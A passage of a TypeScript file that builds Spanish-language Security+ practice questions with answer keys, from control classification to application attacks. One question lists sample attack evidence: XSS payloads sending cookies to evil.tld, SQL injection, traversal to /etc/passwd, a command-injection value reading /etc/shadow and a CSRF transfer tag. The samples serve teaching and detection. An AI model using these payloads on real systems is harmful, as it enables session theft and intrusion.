@@ -1,0 +1,1120 @@
+/**
+ * Classification-matrix PBQs (51+) covering SY0-701 objectives that the hand-built
+ * simulators did not reach: 1.1, 1.3, 2.1, 2.3, 4.6, 5.2, 5.3, 5.4, 5.5 and 5.6.
+ */
+import { MatrixOption, MatrixPbqConfig, PBQItem } from '../types/pbq';
+import { domainNameFor, formatObjective } from './sy0701Objectives';
+
+const o = (value: string, label: string): MatrixOption => ({ value, label });
+
+export interface MatrixPbqDefinition {
+  item: PBQItem;
+  config: MatrixPbqConfig;
+}
+
+const item = (
+  n: number,
+  category: PBQItem['category'],
+  categoryTitle: string,
+  title: string,
+  objective: [string, string[]],
+  minutes: number,
+  scenario: string,
+  requirements: string[],
+  tacticalTip: string
+): PBQItem => ({
+  id: `pbq-${n}`,
+  number: n,
+  category,
+  categoryTitle,
+  title,
+  estimatedMinutes: minutes,
+  domain: domainNameFor(objective[0]),
+  sy0701Objective: formatObjective(objective[0], objective[1]),
+  scenario,
+  requirements,
+  tacticalTip,
+});
+
+// ---------------------------------------------------------------------------
+// PBQ 51 — Security control categories and types (1.1)
+// ---------------------------------------------------------------------------
+const CONTROL_CATEGORY = [
+  o('technical', 'Técnico (Technical)'),
+  o('managerial', 'Gerencial (Managerial)'),
+  o('operational', 'Operativo (Operational)'),
+  o('physical', 'Físico (Physical)'),
+];
+const CONTROL_TYPE = [
+  o('preventive', 'Preventivo (Preventive)'),
+  o('deterrent', 'Disuasorio (Deterrent)'),
+  o('detective', 'Detectivo (Detective)'),
+  o('corrective', 'Correctivo (Corrective)'),
+  o('compensating', 'Compensatorio (Compensating)'),
+  o('directive', 'Directivo (Directive)'),
+];
+
+const PBQ51: MatrixPbqDefinition = {
+  item: item(
+    51,
+    'security-controls',
+    'Categorías y Tipos de Controles',
+    'Clasificación de Controles de Seguridad: Categoría × Tipo',
+    ['1.1', []],
+    6,
+    'El auditor interno te entrega el inventario de controles de la empresa y necesita que cada uno quede clasificado en la matriz de controles para el informe de cumplimiento. Debes indicar la CATEGORÍA (quién/cómo se implementa: técnico, gerencial, operativo o físico) y el TIPO (qué función cumple: prevenir, disuadir, detectar, corregir, compensar o dirigir). Clasifica cada control según su función PRINCIPAL.',
+    [
+      'Asigna a cada control una categoría: Technical, Managerial, Operational o Physical.',
+      'Asigna a cada control un tipo: Preventive, Deterrent, Detective, Corrective, Compensating o Directive.',
+      'Clasifica por la función principal descrita en el escenario, no por todas las funciones posibles.',
+    ],
+    'Pregúntate dos cosas por separado: ¿CÓMO se implementa? (sistema = técnico, documento/decisión de la gerencia = gerencial, personas ejecutando = operativo, objeto en el mundo real = físico) y ¿CUÁNDO actúa? (antes = preventivo/disuasorio, durante = detectivo, después = correctivo; "en lugar de" = compensatorio; "indica qué hacer" = directivo).'
+  ),
+  config: {
+    pbqId: 'pbq-51',
+    consoleTitle: 'Matriz de Controles de Seguridad (Objetivo 1.1)',
+    instructions: 'Para cada control del inventario selecciona su categoría y su tipo. Varias filas pueden compartir la misma respuesta.',
+    sections: [
+      {
+        id: 's1',
+        title: 'Inventario de controles',
+        columns: [
+          { id: 'category', label: 'Categoría', options: CONTROL_CATEGORY },
+          { id: 'type', label: 'Tipo', options: CONTROL_TYPE },
+        ],
+        rows: [
+          {
+            id: 'c1',
+            prompt: 'Una regla del firewall perimetral bloquea todas las conexiones entrantes no solicitadas hacia la red interna.',
+            answers: { category: 'technical', type: 'preventive' },
+            explanation: 'Lo implementa un sistema (técnico) y evita que el ataque ocurra (preventivo).',
+          },
+          {
+            id: 'c2',
+            prompt: 'Al iniciar sesión, un banner (splash screen) advierte que el acceso no autorizado será perseguido legalmente.',
+            answers: { category: 'technical', type: 'deterrent' },
+            explanation: 'Lo muestra el sistema (técnico). No impide el acceso: desalienta al atacante (disuasorio). Trampa: confundirlo con "directivo"; el directivo indica qué hacer, el disuasorio amenaza con consecuencias.',
+          },
+          {
+            id: 'c3',
+            prompt: 'Sensores de movimiento en el pasillo del data center disparan una alarma cuando detectan presencia fuera de horario.',
+            answers: { category: 'physical', type: 'detective' },
+            explanation: 'Dispositivo en el mundo físico que identifica un evento mientras ocurre: físico/detectivo.',
+          },
+          {
+            id: 'c4',
+            prompt: 'El gerente de TI revisa cada mes el reporte de inicios de sesión fallidos y fuera de horario.',
+            answers: { category: 'managerial', type: 'detective' },
+            explanation: 'Es una actividad de supervisión de la gerencia (gerencial) que identifica anomalías ya ocurridas (detectivo).',
+          },
+          {
+            id: 'c5',
+            prompt: 'Tras un ataque de ransomware, el equipo restaura la base de datos desde el último backup inmutable.',
+            answers: { category: 'technical', type: 'corrective' },
+            explanation: 'La restauración la realiza el sistema de backup (técnico) y revierte el daño después del incidente (correctivo).',
+          },
+          {
+            id: 'c6',
+            prompt: 'Un servidor legado no puede recibir el parche crítico; mientras tanto se bloquea el puerto vulnerable con una regla de firewall.',
+            answers: { category: 'technical', type: 'compensating' },
+            explanation: 'El control ideal (parchear) no es viable, así que se aplica otro control "en su lugar": compensatorio. Palabra clave del examen: "no puede... en su lugar".',
+          },
+          {
+            id: 'c7',
+            prompt: 'Un extintor de CO₂ instalado junto a los racks de la sala de servidores.',
+            answers: { category: 'physical', type: 'corrective' },
+            explanation: 'Objeto físico que actúa cuando el incendio ya comenzó para limitar el daño: correctivo.',
+          },
+          {
+            id: 'c8',
+            prompt: 'Un cartel en la puerta del data center: "Solo personal autorizado".',
+            answers: { category: 'physical', type: 'directive' },
+            explanation: 'Indica la conducta esperada (directivo). Compáralo con "Área bajo vigilancia: los intrusos serán procesados", que sería disuasorio.',
+          },
+          {
+            id: 'c9',
+            prompt: 'La dirección aprueba una política de cumplimiento que obliga a cifrar todos los portátiles corporativos.',
+            answers: { category: 'managerial', type: 'directive' },
+            explanation: 'Documento emitido por la gerencia (gerencial) que ordena un comportamiento (directivo). La política no cifra nada por sí misma.',
+          },
+          {
+            id: 'c10',
+            prompt: 'Una cerradura con lector de tarjeta en la puerta del rack de red.',
+            answers: { category: 'physical', type: 'preventive' },
+            explanation: 'Barrera física que impide el acceso antes de que ocurra: físico/preventivo.',
+          },
+        ],
+      },
+    ],
+  },
+};
+
+// ---------------------------------------------------------------------------
+// PBQ 52 — Change management (1.3)
+// ---------------------------------------------------------------------------
+const CHANGE_ELEMENTS = [
+  o('approval', 'Proceso de aprobación (CAB)'),
+  o('ownership', 'Propietario del cambio (Ownership)'),
+  o('stakeholders', 'Partes interesadas (Stakeholders)'),
+  o('impact', 'Análisis de impacto (Impact analysis)'),
+  o('test_results', 'Resultados de pruebas (Test results)'),
+  o('backout', 'Plan de reversión (Backout plan)'),
+  o('maintenance_window', 'Ventana de mantenimiento'),
+  o('sop', 'Procedimiento operativo estándar (SOP)'),
+  o('documentation', 'Actualizar diagramas / políticas / documentación'),
+  o('version_control', 'Control de versiones'),
+  o('allow_list', 'Lista de permitidos / denegados (Allow/Deny list)'),
+  o('dependencies', 'Dependencias'),
+  o('legacy', 'Aplicaciones legadas'),
+  o('restart', 'Reinicio de servicio / aplicación'),
+];
+
+const PBQ52: MatrixPbqDefinition = {
+  item: item(
+    52,
+    'change-management',
+    'Gestión de Cambios',
+    'Proceso de Gestión de Cambios: Elementos de Negocio e Implicaciones Técnicas',
+    ['1.3', []],
+    5,
+    'El equipo de infraestructura debe actualizar el firmware del firewall perimetral y migrar el servidor de base de datos de facturación. El Change Advisory Board (CAB) exige que la solicitud de cambio (RFC) documente cada elemento del proceso. Se te entregan fragmentos de la RFC: identifica a qué elemento del proceso de gestión de cambios o implicación técnica corresponde cada uno.',
+    [
+      'Relaciona cada fragmento de la RFC con el elemento del proceso de gestión de cambios que representa.',
+      'Distingue los procesos de negocio (aprobación, ownership, stakeholders, impacto, backout...) de las implicaciones técnicas (dependencias, allow list, reinicios, legados).',
+    ],
+    'Backout plan = cómo VOLVER atrás si falla. Impact analysis = qué se rompe y qué riesgo hay (antes de aprobar). Test results = evidencia de que se probó en un entorno controlado. Ownership = UNA persona responsable; stakeholders = todos los afectados que deben ser informados.'
+  ),
+  config: {
+    pbqId: 'pbq-52',
+    consoleTitle: 'Solicitud de Cambio RFC-2026-118 (Objetivo 1.3)',
+    instructions: 'Cada fragmento pertenece a la RFC del cambio. Selecciona el elemento del proceso al que corresponde.',
+    sections: [
+      {
+        id: 's1',
+        title: 'Fragmentos de la RFC',
+        columns: [{ id: 'element', label: 'Elemento del proceso', options: CHANGE_ELEMENTS }],
+        rows: [
+          {
+            id: 'r1',
+            prompt: 'El CAB revisa la solicitud en su reunión semanal y la firma antes de que pueda implementarse.',
+            answers: { element: 'approval' },
+            explanation: 'Ningún cambio se implementa sin la aprobación formal del CAB.',
+          },
+          {
+            id: 'r2',
+            prompt: 'Se documenta qué sistemas y usuarios se verán afectados, el riesgo de aplicar el cambio y el riesgo de NO aplicarlo.',
+            answers: { element: 'impact' },
+            explanation: 'El análisis de impacto evalúa consecuencias y riesgo, incluido el de no hacer el cambio.',
+          },
+          {
+            id: 'r3',
+            prompt: 'Si el nuevo firmware falla, se cargará la imagen y configuración anteriores en menos de 10 minutos.',
+            answers: { element: 'backout' },
+            explanation: 'El backout plan define cómo revertir al estado previo. Trampa común: confundirlo con un backup; el backup es un recurso, el backout plan es el procedimiento de reversión.',
+          },
+          {
+            id: 'r4',
+            prompt: 'El cambio se ejecutará el domingo de 02:00 a 04:00, cuando el tráfico es mínimo.',
+            answers: { element: 'maintenance_window' },
+            explanation: 'La ventana de mantenimiento minimiza el impacto en la operación.',
+          },
+          {
+            id: 'r5',
+            prompt: 'El firmware se instaló primero en un firewall idéntico del laboratorio (sandbox) y pasó todas las pruebas de tráfico.',
+            answers: { element: 'test_results' },
+            explanation: 'La evidencia de pruebas en un entorno aislado se adjunta a la RFC antes de la aprobación.',
+          },
+          {
+            id: 'r6',
+            prompt: 'Tras el cambio, se actualizan el diagrama de red y el inventario de reglas del firewall.',
+            answers: { element: 'documentation' },
+            explanation: 'Todo cambio debe reflejarse en diagramas, políticas y procedimientos para que la documentación no quede desactualizada.',
+          },
+          {
+            id: 'r7',
+            prompt: 'Se notifica al gerente de ventas porque el CRM no estará disponible durante la migración.',
+            answers: { element: 'stakeholders' },
+            explanation: 'Los stakeholders son las personas afectadas por el cambio y deben ser informadas.',
+          },
+          {
+            id: 'r8',
+            prompt: 'Los scripts de configuración se guardan en Git con un número de revisión y autor.',
+            answers: { element: 'version_control' },
+            explanation: 'El control de versiones permite rastrear qué cambió, quién lo cambió y volver a versiones anteriores.',
+          },
+          {
+            id: 'r9',
+            prompt: 'Ana, administradora de red, es la responsable de gestionar el cambio de principio a fin y reportar su resultado.',
+            answers: { element: 'ownership' },
+            explanation: 'Ownership: una persona responsable del cambio. No confundir con stakeholders (todos los afectados).',
+          },
+          {
+            id: 'r10',
+            prompt: 'Antes de migrar la BD se descubre que tres microservicios se conectan a ella y deben detenerse en un orden concreto.',
+            answers: { element: 'dependencies' },
+            explanation: 'Dependencias: otros servicios que requieren el sistema modificado y pueden fallar si no se coordinan.',
+          },
+          {
+            id: 'r11',
+            prompt: 'La nueva versión del agente EDR debe añadirse al control de aplicaciones para que se le permita ejecutarse.',
+            answers: { element: 'allow_list' },
+            explanation: 'Si existe application allow listing, el nuevo binario debe autorizarse o será bloqueado.',
+          },
+          {
+            id: 'r12',
+            prompt: 'La aplicación de facturación de 2009 solo soporta TLS 1.0 y no tiene soporte del fabricante.',
+            answers: { element: 'legacy' },
+            explanation: 'Las aplicaciones legadas limitan qué cambios de seguridad pueden aplicarse y requieren consideración especial.',
+          },
+        ],
+      },
+    ],
+  },
+};
+
+// ---------------------------------------------------------------------------
+// PBQ 53 — Third-party agreements and governance documents (5.3 / 5.1)
+// ---------------------------------------------------------------------------
+const AGREEMENTS = [
+  o('sla', 'SLA (Service-Level Agreement)'),
+  o('mou', 'MOU (Memorandum of Understanding)'),
+  o('moa', 'MOA (Memorandum of Agreement)'),
+  o('msa', 'MSA (Master Service Agreement)'),
+  o('sow', 'SOW / WO (Statement of Work / Work Order)'),
+  o('nda', 'NDA (Non-Disclosure Agreement)'),
+  o('bpa', 'BPA (Business Partners Agreement)'),
+  o('roe', 'Reglas de enfrentamiento (Rules of Engagement)'),
+  o('right_to_audit', 'Cláusula de derecho a auditoría (Right-to-audit)'),
+];
+const GOV_DOCS = [
+  o('policy', 'Política (Policy)'),
+  o('standard', 'Estándar (Standard)'),
+  o('procedure', 'Procedimiento (Procedure)'),
+  o('guideline', 'Guía (Guideline)'),
+];
+
+const PBQ53: MatrixPbqDefinition = {
+  item: item(
+    53,
+    'third-party-governance',
+    'Riesgo de Terceros y Gobernanza',
+    'Acuerdos con Terceros y Jerarquía de Documentos de Gobernanza',
+    ['5.3', ['5.1']],
+    6,
+    'Tu empresa está contratando un proveedor de hosting, un consultor de pentesting y un socio comercial para un nuevo producto. El área legal te pide clasificar los documentos que se están negociando. Además, el CISO está reorganizando la biblioteca de documentos de seguridad y necesita que cada documento quede en el nivel correcto de la jerarquía de gobernanza.',
+    [
+      'Sección 1: identifica el tipo de acuerdo con terceros que describe cada cláusula.',
+      'Sección 2: clasifica cada documento interno como política, estándar, procedimiento o guía.',
+    ],
+    'MSA = contrato marco (términos generales) y SOW = detalle de UN proyecto bajo ese marco. MOU = intención, generalmente NO vinculante; MOA = más formal, define responsabilidades. Política = "qué y por qué" (alto nivel), estándar = requisito obligatorio y medible, procedimiento = paso a paso, guía = recomendación opcional.'
+  ),
+  config: {
+    pbqId: 'pbq-53',
+    consoleTitle: 'Revisión Legal de Acuerdos y Biblioteca de Gobernanza',
+    instructions: 'Clasifica cada cláusula o documento. Algunas respuestas pueden no usarse.',
+    sections: [
+      {
+        id: 's1',
+        title: 'Acuerdos con terceros',
+        columns: [{ id: 'doc', label: 'Tipo de acuerdo', options: AGREEMENTS }],
+        rows: [
+          {
+            id: 'a1',
+            prompt: 'El proveedor de hosting garantiza 99,95% de disponibilidad mensual y un crédito del 10% por cada hora de caída adicional.',
+            answers: { doc: 'sla' },
+            explanation: 'El SLA define métricas de servicio medibles (uptime, tiempos de respuesta) y penalizaciones.',
+          },
+          {
+            id: 'a2',
+            prompt: 'Dos universidades firman un documento que expresa su intención de colaborar en investigación, sin obligaciones legales.',
+            answers: { doc: 'mou' },
+            explanation: 'El MOU expresa intención mutua; normalmente no es legalmente vinculante.',
+          },
+          {
+            id: 'a3',
+            prompt: 'Dos agencias gubernamentales formalizan qué responsabilidades asume cada una en un proyecto conjunto y bajo qué condiciones.',
+            answers: { doc: 'moa' },
+            explanation: 'El MOA es más formal y detallado que el MOU: define responsabilidades y condiciones concretas.',
+          },
+          {
+            id: 'a4',
+            prompt: 'Contrato marco con la consultora que fija tarifas, confidencialidad y responsabilidades legales para todos los proyectos futuros.',
+            answers: { doc: 'msa' },
+            explanation: 'El MSA establece los términos generales; cada trabajo concreto se define después en un SOW.',
+          },
+          {
+            id: 'a5',
+            prompt: 'Documento que detalla los entregables, el cronograma y el precio del pentest de la aplicación móvil de este trimestre.',
+            answers: { doc: 'sow' },
+            explanation: 'El SOW/Work Order describe el alcance específico de un proyecto bajo el MSA.',
+          },
+          {
+            id: 'a6',
+            prompt: 'El consultor se compromete por escrito a no revelar información confidencial de la empresa.',
+            answers: { doc: 'nda' },
+            explanation: 'El NDA protege la confidencialidad de la información compartida.',
+          },
+          {
+            id: 'a7',
+            prompt: 'Dos socios definen cómo compartirán ganancias, pérdidas, responsabilidades y la toma de decisiones del nuevo producto.',
+            answers: { doc: 'bpa' },
+            explanation: 'El BPA regula la relación entre socios de negocio (propiedad, ganancias, responsabilidades).',
+          },
+          {
+            id: 'a8',
+            prompt: 'Antes del pentest se acuerda el alcance, el horario permitido, las IP excluidas y los contactos de emergencia.',
+            answers: { doc: 'roe' },
+            explanation: 'Las Rules of Engagement definen los límites del ejercicio y protegen legalmente al pentester.',
+          },
+          {
+            id: 'a9',
+            prompt: 'El contrato con el proveedor de hosting permite a la empresa revisar los controles de seguridad del proveedor con aviso previo.',
+            answers: { doc: 'right_to_audit' },
+            explanation: 'La cláusula right-to-audit es parte de la evaluación continua de riesgo de terceros (vendor monitoring).',
+          },
+        ],
+      },
+      {
+        id: 's2',
+        title: 'Biblioteca de gobernanza',
+        columns: [{ id: 'doc', label: 'Tipo de documento', options: GOV_DOCS }],
+        rows: [
+          {
+            id: 'g1',
+            prompt: '"La organización protegerá la confidencialidad de la información de sus clientes." — aprobado por el directorio.',
+            answers: { doc: 'policy' },
+            explanation: 'Declaración de alto nivel, aprobada por la dirección, que define el qué y el por qué.',
+          },
+          {
+            id: 'g2',
+            prompt: '"Las contraseñas deben tener al menos 14 caracteres y los datos en reposo deben cifrarse con AES-256."',
+            answers: { doc: 'standard' },
+            explanation: 'Requisitos obligatorios, específicos y medibles que implementan la política: estándar.',
+          },
+          {
+            id: 'g3',
+            prompt: '"1) Deshabilitar la cuenta en AD. 2) Revocar tokens de sesión. 3) Recuperar el portátil. 4) Firmar el acta de baja."',
+            answers: { doc: 'procedure' },
+            explanation: 'Instrucciones paso a paso para una tarea concreta (offboarding): procedimiento.',
+          },
+          {
+            id: 'g4',
+            prompt: '"Se recomienda usar frases de contraseña fáciles de recordar, como cuatro palabras al azar."',
+            answers: { doc: 'guideline' },
+            explanation: 'Recomendación no obligatoria: guía. La palabra "recomienda" es la pista en el examen.',
+          },
+        ],
+      },
+    ],
+  },
+};
+
+// ---------------------------------------------------------------------------
+// PBQ 54 — Penetration testing, audits and assessments (5.5)
+// ---------------------------------------------------------------------------
+const ASSESSMENT_TERMS = [
+  o('known', 'Entorno conocido (Known environment)'),
+  o('partial', 'Entorno parcialmente conocido (Partially known)'),
+  o('unknown', 'Entorno desconocido (Unknown environment)'),
+  o('passive', 'Reconocimiento pasivo'),
+  o('active', 'Reconocimiento activo'),
+  o('red', 'Equipo rojo (Red team)'),
+  o('blue', 'Equipo azul (Blue team)'),
+  o('purple', 'Equipo púrpura (Purple team)'),
+  o('internal_audit', 'Auditoría interna'),
+  o('attestation', 'Atestación por auditor externo (External attestation)'),
+  o('bug_bounty', 'Programa de bug bounty'),
+  o('pivot', 'Pivoting / movimiento lateral'),
+  o('persistence', 'Persistencia'),
+];
+
+const PBQ54: MatrixPbqDefinition = {
+  item: item(
+    54,
+    'pentest-audit',
+    'Pentesting y Auditorías',
+    'Tipos de Pruebas de Penetración, Reconocimiento y Auditorías',
+    ['5.5', []],
+    5,
+    'El comité de riesgo planifica el programa anual de evaluaciones de seguridad: varios pentests con distintos niveles de información, ejercicios de equipos rojo/azul, una auditoría para un cliente que exige SOC 2 y un programa público de reporte de vulnerabilidades. Clasifica cada actividad descrita en el plan.',
+    [
+      'Identifica el tipo de entorno de prueba según la información que recibe el evaluador.',
+      'Distingue reconocimiento pasivo de activo y las fases posteriores a la explotación.',
+      'Identifica el tipo de equipo o de auditoría descrito.',
+    ],
+    'Pasivo = NO toca los sistemas del objetivo (OSINT, WHOIS, redes sociales). Activo = interactúa con ellos (escaneos, banner grabbing). Known = toda la información (antes "white box"), Partially known = algo (antes "gray box"), Unknown = nada (antes "black box").'
+  ),
+  config: {
+    pbqId: 'pbq-54',
+    consoleTitle: 'Plan Anual de Evaluaciones de Seguridad (Objetivo 5.5)',
+    instructions: 'Selecciona el término que describe cada actividad del plan.',
+    sections: [
+      {
+        id: 's1',
+        title: 'Actividades del plan',
+        columns: [{ id: 'term', label: 'Término', options: ASSESSMENT_TERMS }],
+        rows: [
+          {
+            id: 'p1',
+            prompt: 'El evaluador recibe diagramas de red, código fuente y credenciales de administrador antes de empezar.',
+            answers: { term: 'known' },
+            explanation: 'Con información completa se trata de un known environment (white box).',
+          },
+          {
+            id: 'p2',
+            prompt: 'El evaluador solo conoce el nombre de la empresa; debe descubrir todo lo demás por su cuenta, como un atacante externo.',
+            answers: { term: 'unknown' },
+            explanation: 'Sin información previa: unknown environment (black box).',
+          },
+          {
+            id: 'p3',
+            prompt: 'El evaluador recibe una cuenta de usuario estándar y la lista de subredes, pero no la documentación de la arquitectura.',
+            answers: { term: 'partial' },
+            explanation: 'Información limitada: partially known environment (gray box).',
+          },
+          {
+            id: 'p4',
+            prompt: 'Recopila nombres de empleados en LinkedIn y registros WHOIS y DNS públicos sin enviar tráfico a los servidores del objetivo.',
+            answers: { term: 'passive' },
+            explanation: 'OSINT sin interactuar con los sistemas del objetivo: reconocimiento pasivo.',
+          },
+          {
+            id: 'p5',
+            prompt: 'Ejecuta "nmap -sV" contra el rango de IP público del cliente para identificar versiones de servicios.',
+            answers: { term: 'active' },
+            explanation: 'Enviar paquetes a los sistemas del objetivo es reconocimiento activo (puede ser detectado).',
+          },
+          {
+            id: 'p6',
+            prompt: 'Tras comprometer un servidor web de la DMZ, el evaluador lo usa como punto de salto para alcanzar la subred de bases de datos.',
+            answers: { term: 'pivot' },
+            explanation: 'Usar un host comprometido para llegar a otros segmentos es pivoting.',
+          },
+          {
+            id: 'p7',
+            prompt: 'El evaluador crea una tarea programada que reabre su acceso cada vez que el servidor se reinicia.',
+            answers: { term: 'persistence' },
+            explanation: 'Mantener el acceso a través de reinicios o cambios de credenciales es persistencia.',
+          },
+          {
+            id: 'p8',
+            prompt: 'Analistas del SOC monitorean, detectan y contienen los ataques simulados durante el ejercicio.',
+            answers: { term: 'blue' },
+            explanation: 'El blue team defiende; el red team ataca.',
+          },
+          {
+            id: 'p9',
+            prompt: 'Atacantes y defensores trabajan juntos y comparten hallazgos en tiempo real para mejorar las detecciones.',
+            answers: { term: 'purple' },
+            explanation: 'Purple team = colaboración rojo + azul con retroalimentación continua.',
+          },
+          {
+            id: 'p10',
+            prompt: 'Una firma auditora independiente emite un informe SOC 2 Type II sobre los controles de la empresa para entregar a clientes.',
+            answers: { term: 'attestation' },
+            explanation: 'Un tercero independiente certifica (attests) la eficacia de los controles: atestación externa.',
+          },
+          {
+            id: 'p11',
+            prompt: 'El departamento de auditoría de la propia empresa verifica que el proceso de altas y bajas de usuarios se cumple.',
+            answers: { term: 'internal_audit' },
+            explanation: 'Realizada por personal de la organización: auditoría interna (a menudo reporta al comité de auditoría).',
+          },
+          {
+            id: 'p12',
+            prompt: 'La empresa publica un programa que paga a investigadores externos por reportar vulnerabilidades de forma responsable.',
+            answers: { term: 'bug_bounty' },
+            explanation: 'Bug bounty: recompensa por divulgación responsable de vulnerabilidades.',
+          },
+        ],
+      },
+    ],
+  },
+};
+
+// ---------------------------------------------------------------------------
+// PBQ 55 — Application attacks from logs and payloads (2.3 / 2.4)
+// ---------------------------------------------------------------------------
+const APP_ATTACKS = [
+  o('xss_reflected', 'XSS reflejado (Reflected)'),
+  o('xss_stored', 'XSS almacenado (Stored / Persistent)'),
+  o('sqli', 'Inyección SQL'),
+  o('traversal', 'Directory traversal'),
+  o('cmd_injection', 'Inyección de comandos'),
+  o('csrf', 'CSRF (Cross-Site Request Forgery)'),
+  o('ssrf', 'SSRF (Server-Side Request Forgery)'),
+  o('buffer_overflow', 'Desbordamiento de búfer (Buffer overflow)'),
+  o('race', 'Condición de carrera (TOCTOU)'),
+  o('spraying', 'Password spraying'),
+  o('brute_force', 'Fuerza bruta'),
+  o('replay', 'Ataque de repetición (Replay)'),
+  o('privesc', 'Escalada de privilegios'),
+];
+const APP_MITIGATIONS = [
+  o('param_queries', 'Consultas parametrizadas (prepared statements)'),
+  o('output_encoding', 'Codificación de salida + Content-Security-Policy'),
+  o('input_validation', 'Validación de entrada con allow list / canonicalización'),
+  o('csrf_token', 'Token anti-CSRF + cookies SameSite'),
+  o('memory_safety', 'Comprobación de límites, ASLR y DEP / lenguaje memory-safe'),
+  o('locking', 'Operaciones atómicas y bloqueos (locking)'),
+  o('mfa_rate_limit', 'MFA + limitación por IP / detección de intentos distribuidos'),
+  o('account_lockout', 'Bloqueo de cuenta tras N intentos fallidos'),
+  o('nonce', 'Nonces / timestamps y tokens de un solo uso'),
+  o('least_privilege', 'Mínimo privilegio + parcheo del sistema'),
+];
+
+const PBQ55: MatrixPbqDefinition = {
+  item: item(
+    55,
+    'app-attacks',
+    'Ataques a Aplicaciones',
+    'Identificación de Ataques a Aplicaciones desde Logs y Payloads',
+    ['2.3', ['2.4']],
+    7,
+    'El WAF y el SIEM capturaron once eventos sospechosos contra las aplicaciones de la empresa durante el fin de semana. Como analista de nivel 2, debes revisar cada evidencia (log, petición HTTP o comportamiento observado), identificar el tipo de ataque o vulnerabilidad y seleccionar la mitigación más eficaz para el equipo de desarrollo.',
+    [
+      'Analiza cada evidencia e identifica el ataque o vulnerabilidad.',
+      'Selecciona la mitigación principal que elimina la causa raíz.',
+      'Fíjate en los indicadores: caracteres especiales, secuencias ../, payloads largos, origen y frecuencia de los intentos.',
+    ],
+    'Busca la firma: <script> o eventos onerror = XSS; \' OR 1=1 o UNION SELECT = SQLi; ../ = traversal; ; | && en un parámetro = command injection; muchos usuarios con UNA contraseña = spraying; UN usuario con muchas contraseñas = fuerza bruta; 0x41414141 / NOP sled = buffer overflow.'
+  ),
+  config: {
+    pbqId: 'pbq-55',
+    consoleTitle: 'Cola de Alertas WAF / SIEM — Aplicaciones Web',
+    instructions: 'Para cada evidencia selecciona el ataque y la mitigación principal.',
+    sections: [
+      {
+        id: 's1',
+        title: 'Eventos capturados',
+        columns: [
+          { id: 'attack', label: 'Ataque / vulnerabilidad', options: APP_ATTACKS },
+          { id: 'mitigation', label: 'Mitigación principal', options: APP_MITIGATIONS },
+        ],
+        rows: [
+          {
+            id: 'e1',
+            prompt: 'Un enlace enviado por correo a varios empleados; la página de búsqueda devuelve el parámetro q sin filtrar.',
+            evidence: "GET /search?q=<script>new Image().src='https://evil.tld/c?'+document.cookie</script> HTTP/1.1",
+            answers: { attack: 'xss_reflected', mitigation: 'output_encoding' },
+            explanation: 'El script viaja en la petición y se refleja en la respuesta solo para quien abre el enlace: XSS reflejado. Se mitiga codificando la salida y con CSP.',
+          },
+          {
+            id: 'e2',
+            prompt: 'Intento de inicio de sesión en el portal de clientes.',
+            evidence: "POST /login  user=admin'--&pass=x  → 302 Location: /dashboard",
+            answers: { attack: 'sqli', mitigation: 'param_queries' },
+            explanation: "La comilla cierra el literal y -- comenta el resto de la consulta (incluida la contraseña): inyección SQL. La defensa principal son las consultas parametrizadas.",
+          },
+          {
+            id: 'e3',
+            prompt: 'Petición al endpoint de descarga de facturas.',
+            evidence: 'GET /download?file=../../../../etc/passwd HTTP/1.1  → 200 OK (root:x:0:0:...)',
+            answers: { attack: 'traversal', mitigation: 'input_validation' },
+            explanation: 'Las secuencias ../ salen del directorio permitido: directory traversal. Se mitiga canonicalizando la ruta y validando contra una allow list.',
+          },
+          {
+            id: 'e4',
+            prompt: 'Herramienta de diagnóstico de red expuesta en el panel de administración.',
+            evidence: 'GET /tools/ping?host=8.8.8.8;cat%20/etc/shadow HTTP/1.1',
+            answers: { attack: 'cmd_injection', mitigation: 'input_validation' },
+            explanation: 'El ; encadena un segundo comando del sistema operativo: inyección de comandos. Validar estrictamente la entrada (solo IP válidas) y no invocar el shell.',
+          },
+          {
+            id: 'e5',
+            prompt: 'Un comentario publicado en el foro ejecuta código en el navegador de TODOS los usuarios que visitan el hilo.',
+            evidence: '<img src=x onerror="fetch(\'https://evil.tld/\'+document.cookie)">',
+            answers: { attack: 'xss_stored', mitigation: 'output_encoding' },
+            explanation: 'El payload queda guardado en el servidor y afecta a cada visitante: XSS almacenado (persistente).',
+          },
+          {
+            id: 'e6',
+            prompt: 'Un cliente con sesión abierta en el banco visita un blog que contiene esta etiqueta; se ejecuta una transferencia que él no pidió.',
+            evidence: '<img src="https://bank.example/transfer?to=ATTACKER&amount=5000" width="0" height="0">',
+            answers: { attack: 'csrf', mitigation: 'csrf_token' },
+            explanation: 'El navegador envía la cookie de sesión válida en una petición forjada por otro sitio: CSRF. Se mitiga con tokens anti-CSRF y cookies SameSite.',
+          },
+          {
+            id: 'e7',
+            prompt: 'El servicio de carga de archivos se cae tras recibir un nombre de archivo de 5.000 caracteres.',
+            evidence: 'filename=AAAAAAAA…AAAA\\x90\\x90\\x90…  → Segmentation fault, EIP=0x41414141',
+            answers: { attack: 'buffer_overflow', mitigation: 'memory_safety' },
+            explanation: 'La entrada excede el búfer y sobrescribe el puntero de instrucción (0x41 = "A"): buffer overflow.',
+          },
+          {
+            id: 'e8',
+            prompt: 'Dos retiros simultáneos de 100 USD leen el saldo (100 USD) antes de que cualquiera lo actualice; la cuenta queda en -100 USD.',
+            answers: { attack: 'race', mitigation: 'locking' },
+            explanation: 'Entre la comprobación (time of check) y el uso (time of use) el estado cambió: condición de carrera / TOCTOU.',
+          },
+          {
+            id: 'e9',
+            prompt: 'Log del proveedor de identidad durante 10 minutos.',
+            evidence: '4.112 cuentas distintas · 1 intento por cuenta · contraseña "Primavera2026!" · origen 203.0.113.50',
+            answers: { attack: 'spraying', mitigation: 'mfa_rate_limit' },
+            explanation: 'Una contraseña común contra muchas cuentas evita el bloqueo por cuenta: password spraying. El bloqueo de cuenta NO lo detiene (1 intento por cuenta); MFA y la detección por origen sí.',
+          },
+          {
+            id: 'e10',
+            prompt: 'Una petición autenticada a la API de pagos capturada en una red Wi-Fi pública se reenvía 50 veces sin modificar.',
+            evidence: 'POST /api/pay  Authorization: Bearer eyJ…  X-Timestamp: 1792700000  (×50, idénticas)',
+            answers: { attack: 'replay', mitigation: 'nonce' },
+            explanation: 'Reutilizar una petición válida capturada es un replay attack. Nonces, timestamps validados y tokens de un solo uso lo impiden.',
+          },
+          {
+            id: 'e11',
+            prompt: 'Tras explotar el servidor web, el atacante ejecuta un exploit del kernel.',
+            evidence: '$ id → uid=33(www-data)   $ ./exploit   $ id → uid=0(root)',
+            answers: { attack: 'privesc', mitigation: 'least_privilege' },
